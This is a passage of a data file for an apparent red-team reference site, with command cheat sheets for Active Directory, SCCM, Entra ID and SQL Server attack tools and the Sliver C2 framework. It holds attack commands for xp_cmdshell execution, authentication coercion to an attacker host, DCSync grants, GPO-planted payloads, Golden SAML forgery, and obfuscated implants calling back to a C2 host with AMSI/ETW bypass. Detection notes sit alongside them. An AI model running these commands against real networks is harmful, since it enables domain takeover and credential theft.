        "brief": "PowerUpSQL is NetSPI's PowerShell toolkit for finding and attacking SQL Servers across a domain — instance discovery via SPNs, privilege and role checks, linked-server enumeration, and crawling chains of database links to reach a server where the attacker is sysadmin and run OS commands with xp_cmdshell. SharpSQL is a C# implementation covering most of the same modules (Get-SQLInstanceDomain, Invoke-SQLAudit, Get-SQLServerLinkCrawl) for in-memory use; where SharpSQL lacks the link-crawl module, PowerUpSQL is compiled to an EXE (PS2EXE) so it can run through execute-assembly too.",
        "quickReference": [
          {
            "label": "Find domain SQL instances",
            "cmd": "Get-SQLInstanceDomain"
          },
          {
            "label": "Check privileges on an instance",
            "cmd": "Invoke-SQLAudit -Instance <sql>   |   Get-SQLServerLinkCrawl -Instance <sql>"
          },
          {
            "label": "OS command via link crawl",
            "cmd": "Get-SQLServerLinkCrawl -Instance <sql> -Query \"exec master..xp_cmdshell 'whoami'\""
          }
        ],
        "sections": [
          {
            "title": "Enumeration & Link Abuse",
            "type": "commands",
            "commands": [
              {
                "label": "SharpSQL — in-memory enumeration",
                "cmd": "execute-assembly -p explorer.exe -t 80 '/path/SharpSQL.exe' 'Get-SQLInstanceDomain'\n'/path/SharpSQL.exe' 'Invoke-SQLAudit -Instance <sql-instance>'\n'/path/SharpSQL.exe' 'Get-SQLServerLinkCrawl -Instance <sql-instance>'"
              },
              {
                "label": "PowerUpSQL — crawl links and run OS commands",
                "cmd": "# compile PowerUpSQL (with a Get-SQLServerLinkCrawl call) to EXE via PS2EXE, then:\nGet-SQLServerLinkCrawl -Instance <sql-instance> -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget <linked-sql>"
              }
            ]
          },
          {
            "title": "Key cmdlets",
            "type": "table",
            "columns": [
              "Cmdlet",
              "Purpose"
            ],
            "rows": [
              [
                "Get-SQLInstanceDomain",
                "Find SQL instances in the domain via their SPNs"
              ],
              [
                "Get-SQLInstanceScanUDP",
                "Discover instances by UDP broadcast"
              ],
              [
                "Get-SQLConnectionTestThreaded",
                "Which discovered instances you can actually log into"
              ],
              [
                "Invoke-SQLAudit",
                "Run all built-in privilege / misconfiguration checks"
              ],
              [
                "Get-SQLServerLinkCrawl",
                "Crawl linked-server chains (openquery) across trust"
              ],
              [
                "Get-SQLServerLoginDefaultPw",
                "Test well-known default sa / appliance passwords"
              ],
              [
                "Invoke-SQLOSCmd",
                "Run OS commands (xp_cmdshell) where you are sysadmin"
              ],
              [
                "Get-SQLColumnSampleDataThreaded -Keyword \"password,ssn\"",
                "Hunt sensitive data across databases"
              ],
              [
                "Get-SQLServerPriv / Invoke-SQLImpersonateService",
                "Enumerate/abuse IMPERSONATE and TRUSTWORTHY for privesc"
              ]
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "A SQL login is not required on every hop: Get-SQLServerLinkCrawl reaches a server where the chained service account is sysadmin, giving xp_cmdshell without creds on that box.",
              "Coerce auth to capture/relay: xp_dirtree / xp_fileexist against \\\\<attacker>\\x makes the SQL service account authenticate to you — pair with Responder or ntlmrelayx.",
              "SharpSQL (C#) covers most modules in memory; for the link-crawl, compile PowerUpSQL with PS2EXE and run it via execute-assembly."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "PowerUpSQL — GitHub (NetSPI)",
                "url": "https://github.com/NetSPI/PowerUpSQL"
              },
              {
                "label": "Vulns — SQL Server Links",
                "url": "vulns.html"
              }
            ]
          }
        ]
      },
      {
              "id": "dacledit",
              "name": "dacledit.py",
              "url": "https://github.com/fortra/impacket",
              "description": "Read and write object DACLs from Linux — the tool that turns an ACL finding into concrete access.",
              "brief": "dacledit.py (part of Impacket's example scripts) reads and edits the security descriptor — the DACL — of Active Directory objects over LDAP. Where BloodHound tells you that a principal has GenericAll, WriteDacl or WriteOwner over a target, dacledit is how you exercise that right from Linux: add an ACE granting yourself full control, DCSync, or the specific extended right you need.\n\nIt is the general-purpose primitive behind many AD escalation edges. Typical uses are granting yourself DS-Replication rights on the domain head (to DCSync later), giving yourself GenericAll over a user or computer, or backdooring an object's DACL for persistence. Every write is a directory-object change (event 5136), so it is auditable where SACLs are configured.",
              "quickReference": [
                      {
                              "label": "Read an object's DACL",
                              "cmd": "dacledit.py -action read -target '<samaccountname>' '<domain>/<user>:<pass>'"
                      },
                      {
                              "label": "Grant FullControl over a target",
                              "cmd": "dacledit.py -action write -rights FullControl -principal <you> -target '<victim>' '<domain>/<user>:<pass>'"
                      },
                      {
                              "label": "Grant yourself DCSync",
                              "cmd": "dacledit.py -action write -rights DCSync -principal <you> -target-dn '<domain_dn>' '<domain>/<user>:<pass>'"
                      }
              ],
              "sections": [
                      {
                              "title": "Usage",
                              "type": "commands",
                              "commands": [
                                      {
                                              "label": "Enumerate who has rights over an object",
                                              "cmd": "dacledit.py -action read -target '<victim>' -principal '<you>' '<domain>/<user>:<pass>' -dc-ip <dc_ip>"
                                      },
                                      {
                                              "label": "Write an ACE (escalation)",
                                              "cmd": "# grant yourself GenericAll over a user you can already influence:\ndacledit.py -action write -rights FullControl -principal '<you>' -target '<victim>' '<domain>/<user>:<pass>'"
                                      },
                                      {
                                              "label": "Grant DCSync on the domain root",
                                              "cmd": "dacledit.py -action write -rights DCSync -principal '<lowpriv_you>' -target-dn 'DC=<dom>,DC=<tld>' '<domain>/<user>:<pass>'\n# then run secretsdump -just-dc later"
                                      },
                                      {
                                              "label": "Authenticate with a hash / ticket",
                                              "cmd": "dacledit.py ... -hashes :<nthash>\ndacledit.py ... -k -no-pass        # Kerberos"
                                      }
                              ]
                      },
                      {
                              "title": "Useful -rights values",
                              "type": "table",
                              "columns": [
                                      "Value",
                                      "Grants"
                              ],
                              "rows": [
                                      [
                                              "FullControl",
                                              "GenericAll — total control of the object"
                                      ],
                                      [
                                              "DCSync",
                                              "The replication extended rights (Get-Changes / Get-Changes-All)"
                                      ],
                                      [
                                              "WriteMembers",
                                              "Add members to a group"
                                      ],
                                      [
                                              "ResetPassword",
                                              "Force-change the target's password"
                                      ]
                              ]
                      },
                      {
                              "title": "OPSEC & defence",
                              "type": "notes",
                              "items": [
                                      "Every write emits directory-service change event 5136 on the object's nTSecurityDescriptor — monitor privileged objects (the domain head, admin groups).",
                                      "Use -action read first to record the original DACL so you can restore it and to confirm the right actually applies.",
                                      "This is the execution end of the ACL abuse edges — the concepts are on the ACLs & DACLs theory page."
                              ]
                      },
                      {
                              "title": "References",
                              "type": "references",
                              "items": [
                                      {
                                              "label": "Impacket — GitHub (fortra)",
                                              "url": "https://github.com/fortra/impacket"
                                      },
                                      {
                                              "label": "Theory — ACLs and DACLs",
                                              "url": "theory/2026-08-18-acls-dacls.html"
                                      },
                                      {
                                              "label": "Theory — DCSync",
                                              "url": "theory/2026-08-18-dcsync.html"
                                      }
                              ]
                      }
              ]
      },
      {
        "id": "sharpgpoabuse",
        "name": "SharpGPOAbuse",
        "url": "https://github.com/ReversecLabs/SharpGPOAbuse",
        "description": "Turns write access over a GPO into code execution / local admin on every machine in its scope.",
        "brief": "SharpGPOAbuse abuses a writable Group Policy Object. If you can edit a GPO (WriteProperty/WriteDacl on the GPC, a common ACL finding), you control policy for every computer or user the GPO is linked to. SharpGPOAbuse writes the malicious policy — an immediate scheduled task, a startup script, or a new local-admin membership — that the targeted machines apply at the next policy refresh.\n\nIt is a mass code-execution primitive: one writable GPO linked to a busy OU can mean SYSTEM on dozens of hosts. The changes bump the GPO version and add scheduled-task or registry policy items, which are auditable, so it is powerful but not subtle.",
        "quickReference": [
          {
            "label": "Add an immediate task (SYSTEM)",
            "cmd": "SharpGPOAbuse.exe --AddComputerTask --TaskName 'update' --Author <domain>\\<user> --Command 'cmd.exe' --Arguments '/c <payload>' --GPOName '<GPO>'"
          },
          {
            "label": "Add yourself as local admin",
            "cmd": "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName '<GPO>'"
          },
          {
            "label": "User logon task",
            "cmd": "SharpGPOAbuse.exe --AddUserTask --TaskName 'x' --Author <a> --Command 'cmd' --Arguments '/c <payload>' --GPOName '<GPO>'"
          }
        ],
        "sections": [
          {
            "title": "Key flags",
            "type": "table",
            "columns": [
              "Flag",
              "Purpose"
            ],
            "rows": [
              [
                "--AddComputerTask",
                "Add an immediate scheduled task that runs as SYSTEM on scoped computers"
              ],
              [
                "--AddUserTask",
                "Add a scheduled task that runs in a scoped user's context"
              ],
              [
                "--AddLocalAdmin",
                "Add an account to local Administrators on scoped hosts"
              ],
              [
                "--AddUserRights",
                "Grant user rights (e.g. SeDebugPrivilege, SeTakeOwnershipPrivilege) via GPO"
              ],
              [
                "--TaskName <n> / --Author <DOM\\user>",
                "Identity of the planted task (make it look legitimate)"
              ],
              [
                "--Command <bin> / --Arguments <args>",
                "What the task executes"
              ],
              [
                "--UserAccount <user>",
                "Account for --AddLocalAdmin / --AddUserRights"
              ],
              [
                "--GPOName \"<name>\" / --GPOId <guid>",
                "The writable GPO to weaponise"
              ],
              [
                "--Force",
                "Apply even when the GPO is not currently linked"
              ]
            ]
          },
          {
            "title": "Usage",
            "type": "commands",
            "commands": [
              {
                "label": "Computer immediate task → SYSTEM on scoped hosts",
                "cmd": "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author '<domain>\\<user>' --Command 'powershell.exe' --Arguments '-enc <b64>' --GPOName '<Vulnerable GPO>'"
              },
              {
                "label": "Grant local admin across the OU",
                "cmd": "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount '<you>' --GPOName '<Vulnerable GPO>'"
              },
              {
                "label": "Force a refresh (or wait ~90 min)",
                "cmd": "# on a host you already control: gpupdate /force"
              }
            ]
          },
          {
            "title": "OPSEC & defence",
            "type": "notes",
            "items": [
              "Bumps the GPO version (GPT.ini) and drops scheduled-task/registry policy — 5136 on the GPC and new tasks are the signal.",
              "Prefer removing the change after execution; a lingering immediate task re-runs and is easy to spot.",
              "pyGPOAbuse is the Linux equivalent when you only have creds and no Windows foothold."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "SharpGPOAbuse — GitHub",
                "url": "https://github.com/ReversecLabs/SharpGPOAbuse"
              },
              {
                "label": "Theory — Group Policy (GPO)",
                "url": "theory/2026-08-18-group-policy.html"
              }
            ]
          }
        ]
      },
      {
        "id": "gmsadumper",
        "name": "gMSADumper",
        "url": "https://github.com/micahvandeusen/gMSADumper",
        "description": "Recovers group-Managed Service Account passwords over LDAP for principals allowed to read them.",
        "brief": "gMSADumper retrieves the password blob of a group-Managed Service Account (gMSA). A gMSA's password is managed by AD and readable only by the principals listed in its msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword) attribute. If you control one of those principals, gMSADumper reads the msDS-ManagedPassword blob and derives the account's NT hash.\n\nBecause gMSAs frequently run privileged services, recovering one often yields a high-value credential you can use for pass-the-hash or to Kerberoast dependent SPNs. The read is a normal LDAP query, but access to msDS-ManagedPassword by an unexpected principal is auditable.",
        "quickReference": [
          {
            "label": "Dump gMSA passwords",
            "cmd": "gMSADumper.py -u <user> -p '<pass>' -d <domain>"
          },
          {
            "label": "With a hash",
            "cmd": "nxc ldap <dc_ip> -u <user> -H <nthash> --gmsa"
          },
          {
            "label": "Via NetExec",
            "cmd": "nxc ldap <dc_ip> -u <user> -p '<pass>' --gmsa"
          }
        ],
        "sections": [
          {
            "title": "Ways to read a gMSA password",
            "type": "table",
            "columns": [
              "Method",
              "Command"
            ],
            "rows": [
              [
                "gMSADumper.py",
                "gMSADumper.py -u <user> -p <pass> -d <domain> [-l <dc>]"
              ],
              [
                "NetExec",
                "nxc ldap <dc> -u <user> -p <pass> --gmsa"
              ],
              [
                "bloodyAD",
                "bloodyAD -u <user> -p <pass> -d <domain> --host <dc> get object <gmsa$> --attr msDS-ManagedPassword"
              ],
              [
                "DSInternals (Windows)",
                "Get-ADServiceAccount <gmsa> -Properties msDS-ManagedPassword | ConvertFrom-ADManagedPasswordBlob"
              ],
              [
                "Then reuse",
                "Pass-the-Hash with the NT hash, or Kerberoast the gMSA's dependent SPNs"
              ]
            ]
          },
          {
            "title": "Usage",
            "type": "commands",
            "commands": [
              {
                "label": "Retrieve the managed password / NT hash",
                "cmd": "gMSADumper.py -u <user> -p '<pass>' -d <domain> -l <dc_ip>"
              },
              {
                "label": "Use the recovered hash",
                "cmd": "nxc smb <target> -u '<gmsa$>' -H <nthash>"
              }
            ]
          },
          {
            "title": "OPSEC & defence",
            "type": "notes",
            "items": [
              "Only members of msDS-GroupMSAMembership can read the blob — audit that list and 4662 reads of msDS-ManagedPassword.",
              "A gMSA is only as safe as the principals allowed to read it; a compromised low-priv member exposes the service account."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "gMSADumper — GitHub",
                "url": "https://github.com/micahvandeusen/gMSADumper"
              },
              {
                "label": "Theory — Windows Credential Storage",
                "url": "theory/2026-08-18-windows-credential-storage.html"
              }
            ]
          }
        ]
      },
      {
        "id": "gettgtpkinit",
        "name": "gettgtpkinit",
        "url": "https://github.com/dirkjanm/PKINITtools",
        "description": "Requests a Kerberos TGT using a certificate (PKINIT) — the bridge from a cert to a ticket.",
        "brief": "gettgtpkinit (from PKINITtools) performs the PKINIT exchange: it presents a certificate and its private key to the KDC and receives a Kerberos TGT for the certificate's identity. It is the Linux tool that turns any client-authentication certificate — from AD CS abuse (ESC1 etc.) or a Shadow Credential — into a usable ticket.\n\nIt pairs with getnthash (also in PKINITtools) to perform UnPAC-the-hash: once you hold the PKINIT TGT and its session key, you can recover the account's NT hash from the ticket's PAC_CREDENTIAL_INFO, unifying the certificate and hash worlds.",
        "quickReference": [
          {
            "label": "Cert → TGT",
            "cmd": "gettgtpkinit.py -cert-pfx <user>.pfx -pfx-pass <pfx_pass> <domain>/<user> user.ccache"
          },
          {
            "label": "Use the ticket",
            "cmd": "export KRB5CCNAME=user.ccache ; nxc smb <target> -k --use-kcache"
          },
          {
            "label": "UnPAC the hash",
            "cmd": "getnthash.py -key <AS-REP-key> <domain>/<user>"
          }
        ],
        "sections": [
          {
            "title": "PKINITtools scripts & flags",
            "type": "table",
            "columns": [
              "Item",
              "Purpose"
            ],
            "rows": [
              [
                "gettgtpkinit.py",
                "Certificate (PFX) -> Kerberos TGT; prints the AS-REP encryption key"
              ],
              [
                "getnthash.py",
                "TGT + AS-REP key -> the account's NT hash (UnPAC-the-hash)"
              ],
              [
                "gets4uticket.py",
                "Use the PKINIT TGT for an S4U (impersonation) ticket"
              ],
              [
                "-cert-pfx <f> / -pfx-pass <p> / -pfx-base64 <b64>",
                "Certificate input (file or base64)"
              ],
              [
                "-dc-ip <ip> / -v",
                "Target KDC / verbose output"
              ],
              [
                "All-in-one alternative",
                "certipy auth -pfx <f> does cert->TGT and prints the NT hash in one step"
              ]
            ]
          },
          {
            "title": "Usage",
            "type": "commands",
            "commands": [
              {
                "label": "Obtain a TGT from a certificate",
                "cmd": "gettgtpkinit.py -cert-pfx <user>.pfx -pfx-pass '<pfx_pass>' <domain>/<user> user.ccache\n# prints the AS-REP encryption key you need for UnPAC-the-hash"
              },
              {
                "label": "Recover the NT hash (UnPAC)",
                "cmd": "getnthash.py -key '<as_rep_key>' <domain>/<user>\n# certipy auth -pfx <user>.pfx also does cert->TGT and prints the hash in one step"
              }
            ]
          },
          {
            "title": "OPSEC & defence",
            "type": "notes",
            "items": [
              "Needs a PKINIT-capable KDC (a DC/KDC certificate). PKINIT AS-REQ (4768 with certificate info) from an odd host is the signal.",
              "This is the mechanism behind Shadow Credentials and AD CS abuse — read the Shadow Credentials / PKINIT theory page."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "PKINITtools — GitHub (dirkjanm)",
                "url": "https://github.com/dirkjanm/PKINITtools"
              },
              {
                "label": "Theory — Shadow Credentials, PKINIT & UnPAC",
                "url": "theory/2026-09-24-shadow-credentials-pkinit.html"
              },
              {
                "label": "Theory — AD Certificate Services",
                "url": "theory/2026-08-18-adcs.html"
              }
            ]
          }
        ]
      },
      {
              "id": "sharpsccm",
              "name": "SharpSCCM",
              "url": "https://github.com/Mayyhem/SharpSCCM",
              "description": "Enumerate and abuse SCCM/MECM — recover NAA/secrets, coerce client push, and execute on clients.",
              "brief": "SharpSCCM is the primary offensive tool for Microsoft Configuration Manager (SCCM/MECM). It talks to the management point and SMS provider to enumerate the hierarchy, request policies, recover the Network Access Account and other stored secrets, trigger client-push authentication (for coercion/relay), and — once you hold an SCCM admin role — execute payloads on managed devices as SYSTEM.\n\nIt is the swiss-army knife behind most of the SCCM lane on the attack-path map: 'get secrets' loots credentials, 'invoke client-push' produces coercible authentication to relay to the SMS provider or site database, and 'exec' turns an admin role into mass code execution. See the SCCM/MECM Abuse theory page for the full workflow.",
              "quickReference": [
                      {
                              "label": "Enumerate devices",
                              "cmd": "SharpSCCM.exe get devices -sms <SMS_PROVIDER>"
                      },
                      {
                              "label": "Recover NAA / secrets",
                              "cmd": "SharpSCCM.exe get secrets -r <newcomputer>"
                      },
                      {
                              "label": "Coerce client-push auth",
                              "cmd": "SharpSCCM.exe invoke client-push -mp <mp> -sc <site_code> -t <relay_ip>"
                      },
                      {
                              "label": "Execute on a device (SYSTEM)",
                              "cmd": "SharpSCCM.exe exec -d <device> -p '<payload>'"
                      }
              ],
              "sections": [
                      {
                              "title": "Enumeration",
                              "type": "commands",
                              "commands": [
                                      {
                                              "label": "Map the site and its objects",
                                              "cmd": "SharpSCCM.exe get devices -sms <SMS_PROVIDER>\nSharpSCCM.exe get collections\nSharpSCCM.exe get primary-users"
                                      }
                              ]
                      },
                      {
                              "title": "Credential looting",
                              "type": "commands",
                              "commands": [
                                      {
                                              "label": "Recover the Network Access Account and policy secrets",
                                              "cmd": "SharpSCCM.exe get secrets -r <newcomputer>\n# registers/impersonates a client, requests machine policy, decrypts the NAA blob"
                                      }
                              ]
                      },
                      {
                              "title": "Coercion & takeover",
                              "type": "commands",
                              "commands": [
                                      {
                                              "label": "Trigger client-push (auth to relay)",
                                              "cmd": "SharpSCCM.exe invoke client-push -mp <mp> -sc <site_code> -t <relay_ip>\n# relay the site-server/machine auth to the SMS provider (grant Full Admin) or the site DB"
                                      }
                              ]
                      },
                      {
                              "title": "Execution (as SCCM admin)",
                              "type": "commands",
                              "commands": [
                                      {
                                              "label": "Run a payload on a client as SYSTEM",
                                              "cmd": "SharpSCCM.exe exec -d <device_name> -p '<payload>'\n# or deploy an application/script to a whole collection"
                                      }
                              ]
                      },
                      {
                              "title": "OPSEC & defence",
                              "type": "notes",
                              "items": [
                                      "New device registration followed by policy/NAA retrieval, unexpected Full Administrators, and out-of-band application/script deployments are the key signals.",
                                      "Defence: PKI/HTTPS + Enhanced HTTP and retire the NAA; disable automatic site-wide client push; treat site systems as Tier 0."
                              ]
                      },
                      {
                              "title": "References",
                              "type": "references",
                              "items": [
                                      {
                                              "label": "SharpSCCM — GitHub (Mayyhem)",
                                              "url": "https://github.com/Mayyhem/SharpSCCM"
                                      },
                                      {
                                              "label": "Theory — SCCM / MECM Abuse",
                                              "url": "theory/2026-09-24-sccm-mecm-abuse.html"
                                      }
                              ]
                      }
              ]
      },
      {
        "id": "sccmhunter",
        "name": "sccmhunter",
        "url": "https://github.com/garrettfoster13/sccmhunter",
        "description": "Python SCCM recon and attack toolkit — find the hierarchy, request policies and relay from Linux.",
        "brief": "sccmhunter is a Python toolkit for profiling and attacking SCCM/MECM from Linux. Its 'find' module locates management points, distribution points and site codes via LDAP and HTTP; its 'http' module registers a device and requests policies (including the NAA); and it supports the coercion/relay paths to take over a site — all without needing a Windows host.\n\nIt complements SharpSCCM (the C# tool) and is the go-to when you are operating from a Linux box with only domain credentials. The SCCM/MECM Abuse theory page ties the modules to the overall attack.",
        "quickReference": [
          {
            "label": "Find the hierarchy",
            "cmd": "sccmhunter.py find -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip>"
          },
          {
            "label": "Request policies (NAA)",
            "cmd": "sccmhunter.py http -u <user> -p '<pass>' -d <domain> ..."
          },
          {
            "label": "Show findings",
            "cmd": "sccmhunter.py show -all"
          }
        ],
        "sections": [
          {
            "title": "Modules",
            "type": "table",
            "columns": [
              "Module",
              "Purpose"
            ],
            "rows": [
              [
                "find",
                "LDAP recon: management points, distribution points, site systems and site codes"
              ],
              [
                "smb",
                "Profile discovered hosts (SMB / HTTP / MSSQL); hunt PXE and NAA variable files"
              ],
              [
                "http",
                "Register a device, request policies, and recover the Network Access Account (client-push) credential"
              ],
              [
                "admin",
                "Interactive shell to the SMS Provider AdminService (add_admin, get_creds)"
              ],
              [
                "dpapi",
                "Decrypt secrets from a compromised client (after recovering the NAA)"
              ],
              [
                "show",
                "Display / export results stored in the local DB (show -all)"
              ]
            ]
          },
          {
            "title": "Usage",
            "type": "commands",
            "commands": [
              {
                "label": "Profile the environment",
                "cmd": "sccmhunter.py find -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip>\nsccmhunter.py smb  -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip>\nsccmhunter.py show -all"
              },
              {
                "label": "Recover the Network Access Account (client push)",
                "cmd": "sccmhunter.py http -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> -target <mp.fqdn>"
              },
              {
                "label": "Site takeover via the AdminService",
                "cmd": "sccmhunter.py admin -u <user> -p '<pass>' -ip <smsprovider>\n# in the shell: get_creds ; add_admin <user> <sid>"
              }
            ]
          },
          {
            "title": "OPSEC & defence",
            "type": "notes",
            "items": [
              "Same signals as SharpSCCM — device registration + policy requests, admin changes. Defence: Enhanced HTTP, no NAA, Tier-0 site systems."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "sccmhunter — GitHub (garrettfoster13)",
                "url": "https://github.com/garrettfoster13/sccmhunter"
              },
              {
                "label": "Theory — SCCM / MECM Abuse",
                "url": "theory/2026-09-24-sccm-mecm-abuse.html"
              }
            ]
          }
        ]
      },
      {
              "id": "aadinternals",
              "name": "AADInternals",
              "url": "https://github.com/Gerenios/AADInternals",
              "description": "PowerShell toolkit for attacking Entra ID / Azure AD and the on-prem hybrid sync bridge.",
              "brief": "AADInternals is the reference PowerShell toolkit for Entra ID (Azure AD) tradecraft, and the tool that bridges on-prem AD compromise into the cloud. Its most consequential AD use is against Azure AD Connect: from the sync server it recovers the credentials of the sync accounts (the on-prem MSOL_ account and the cloud Directory Synchronization account), which hold sweeping rights on both sides of the hybrid identity.\n\nWith those it can reset passwords, forge SAML tokens (the 'Golden SAML' family via a compromised ADFS token-signing key), and manipulate directory objects — turning a domain compromise into tenant compromise, and vice-versa. It is broad; on an AD engagement the sync-credential recovery is the key hop.",
              "quickReference": [
                      {
                              "label": "Recover sync credentials",
                              "cmd": "Get-AADIntSyncCredentials"
                      },
                      {
                              "label": "Reset a synced user's password (as MSOL_)",
                              "cmd": "Set-AADIntUserPassword -SourceAnchor <anchor> -Password '<new>'"
                      },
                      {
                              "label": "Dump ADFS signing key (Golden SAML)",
                              "cmd": "Export-AADIntADFSSigningCertificate"
                      }
              ],
              "sections": [
                      {
                              "title": "Hybrid bridge (Azure AD Connect)",
                              "type": "commands",
                              "commands": [
                                      {
                                              "label": "Recover the sync account secrets (on the AAD Connect server)",
                                              "cmd": "Import-Module AADInternals\nGet-AADIntSyncCredentials\n# yields the on-prem MSOL_ account and the cloud sync account credentials"
                                      },
                                      {
                                              "label": "Abuse the recovered rights",
                                              "cmd": "# MSOL_ can DCSync on-prem; the cloud sync account has broad Graph rights\nSet-AADIntUserPassword -SourceAnchor '<immutableId>' -Password '<new>' -Verbose"
                                      }
                              ]
                      },
                      {
                              "title": "Cloud / federation",
                              "type": "commands",
                              "commands": [
                                      {
                                              "label": "Golden SAML (with the ADFS key)",
                                              "cmd": "Export-AADIntADFSSigningCertificate\nNew-AADIntSAMLToken -ImmutableID '<id>' -PfxFileName ADFS.pfx -Issuer '<issuer>'"
                                      }
                              ]
                      },
                      {
                              "title": "OPSEC & defence",
                              "type": "notes",
                              "items": [
                                      "The MSOL_ account authenticating from an unusual host, and anomalous Entra sign-ins, are the signals.",
                                      "Defence: treat the AAD Connect server as Tier 0, protect the ADFS token-signing key, and monitor the sync accounts closely."
                              ]
                      },
                      {
                              "title": "References",
                              "type": "references",
                              "items": [
                                      {
                                              "label": "AADInternals — GitHub (Gerenios)",
                                              "url": "https://github.com/Gerenios/AADInternals"
                                      },
                                      {
                                              "label": "Theory — Domain and Forest Trusts",
                                              "url": "theory/2026-08-18-trusts.html"
                                      }
                              ]
                      }
              ]
      }
    ]
  },
  {
    category: "Command & Control",
    tools: [
      {
        id: "sliver",
        name: "Sliver",
        url: "https://github.com/BishopFox/sliver",
        description: "Open-source, cross-platform Command & Control framework for adversary simulation.",
        brief: "Sliver is BishopFox's open-source, Go-based C2 framework and a common Cobalt Strike alternative on real engagements. A sliver-server runs listeners (HTTP(S), mTLS, DNS, WireGuard) and compiles obfuscated implants on demand; implants call back as quiet asynchronous beacons or interactive sessions, and the operator tasks them from a console that supports multiplayer.\n\nIts value on an engagement is in-memory tradecraft: execute-assembly and BOF/armory extensions run the standard C#/BOF toolset without dropping tools to disk, with fork-and-run or inline execution, PPID spoofing, and AMSI/ETW bypasses. TCP and named-pipe pivots fan C2 across a segmented network from a single foothold.\n\nThis page is a reference to Sliver's own commands and features. The techniques you would run through it — AD enumeration, service-abuse privilege escalation, Kerberos attacks, AD CS abuse, RBCD, DCSync, SQL-link and CI/CD abuse, LSASS dumping — are documented in the Vulns & Misconfigs section, and the concepts are in the Theory section (C2 Frameworks, Sliver C2, Windows Telemetry, In-Memory Tradecraft). Values shown as <…> are placeholders.",
        quickReference: [
          { label: "Start the server", cmd: "sudo ./sliver-server" },
          { label: "Start an HTTPS listener", cmd: "https        # then: jobs" },
          { label: "Generate a beacon (shellcode)", cmd: "generate -b https://<c2-host> -e -f shellcode -N <implant-name> -s <save-path>" },
          { label: "Interact with an implant", cmd: "sessions   |   beacons   |   use <id>" },
          { label: "Run a .NET tool in memory", cmd: "execute-assembly -p <parent-proc> -t <timeout> '<path>/Tool.exe' '<args>'" },
          { label: "Inline w/ AMSI+ETW bypass", cmd: "execute-assembly -i -M -E -t <timeout> '<path>/Tool.exe' '<args>'" }
        ],
        sections: [
          {
            title: "Setup & Deployment",
            type: "commands",
            commands: [
              { label: "Start the Sliver C2 server (Linux/WSL — not Windows)", cmd: "# only the sliver-server (C2) and sliver-client (multiplayer) binaries are needed\n./sliver-server\n[server] sliver >" },
              { label: "Start an egress listener and list jobs", cmd: "[server] sliver > https                 # HTTPS listener (also: mtls / dns / wg)\n[*] Starting HTTPS :443 listener ... started job #1\n[server] sliver > jobs                  # list active listeners/jobs\n# listeners support custom or Let's Encrypt certificates" },
              { label: "Generate a beacon implant as shellcode (obfuscated)", cmd: "generate -b https://<c2-host> -e -f shellcode -N <implant-name> -s <save-path>\n# -b beacon URL | -e symbol obfuscation/encoder | -f format | -N name | -s save path" },
              { label: "Host the implant/tools for delivery", cmd: "python3 -m http.server <port>          # or any web server, from the folder holding the implant" },
              { label: "Detonate the implant on the target (assumed breach)", cmd: "# a shellcode loader on the target injects the hosted implant; a new session/beacon appears:\n<loader>.exe <c2-host> <port> <implant-name>.bin" },
              { label: "Select the implant and migrate into a stable process", cmd: "[server] sliver > use <session-id>\n[server] sliver (<implant-name>) > ps -e <process>   # find a stable host PID\n[server] sliver (<implant-name>) > migrate -p <pid>  # stealthier + stable session\n[server] sliver (<implant-name>) > whoami" }
            ]
          },
          {
            title: "generate — implant build flags",
            type: "table",
            columns: ["Flag", "Purpose"],
            rows: [
              ["-b <url>", "Beacon callback URL (asynchronous implant); use --mtls / --http / --dns for other protocols"],
              ["-b vs session", "Omit -b / use session flags for an interactive session implant instead of a beacon"],
              ["-f <format>", "Output format: exe, shared (dll), service, or shellcode"],
              ["-e", "Enable symbol obfuscation and shellcode encoding (reduces static detection)"],
              ["-N <name>", "Implant name"],
              ["-s <path>", "Save the built implant to this path"],
              ["--tcp-pivot <host:port>", "Build an implant that connects to a TCP pivot instead of the internet (internal hosts)"],
              ["profiles / stager", "Save a build recipe as a profile; build a small stager that pulls the full implant over C2"]
            ]
          },
          {
            title: "Listeners & Egress Protocols",
            type: "table",
            columns: ["Command", "Protocol / use"],
            rows: [
              ["https / http", "Procedurally-generated C2 over web traffic — the everyday default; custom/Let's Encrypt certs"],
              ["mtls", "Mutually-authenticated TLS where raw-socket egress is allowed"],
              ["dns", "Slow but almost always permitted; includes a DNS canary to detect sandbox detonation"],
              ["wg", "WireGuard tunnel, typically for internal use"],
              ["jobs / jobs -k <id>", "List running listeners (jobs); kill a job"]
            ]
          },
          {
            title: "Sessions, Beacons & Host Info",
            type: "commands",
            commands: [
              { label: "List and select implants", cmd: "sessions                 # interactive sessions\nbeacons                  # asynchronous beacons\nuse <id>                 # select an implant; all commands scope to it\nsessions -i <id>         # interact with a specific session\ninfo                     # details about the current implant" },
              { label: "Basic host / identity", cmd: "whoami                   # current token identity\ngetprivs                 # token privileges\nps                       # process list\nps -e <process>          # filter by name\nps -c -o '<DOMAIN\\user>' # find processes owned by a user (token/migration targets)" },
              { label: "Beacon tempo", cmd: "reconfig -i <seconds> -j <jitter>   # adjust sleep interval and jitter\ninteractive                          # upgrade a beacon to an interactive session" }
            ]
          },
          {
            title: "Process Injection, Migration & PPID Spoofing",
            type: "commands",
            commands: [
              { label: "Migrate the implant into another process", cmd: "migrate -p <pid> -t <timeout>     # migrate into a running PID\nmigrate -n <process>              # migrate by process name\n# common blend-in hosts: explorer.exe, svchost.exe, dllhost.exe, RuntimeBroker.exe" },
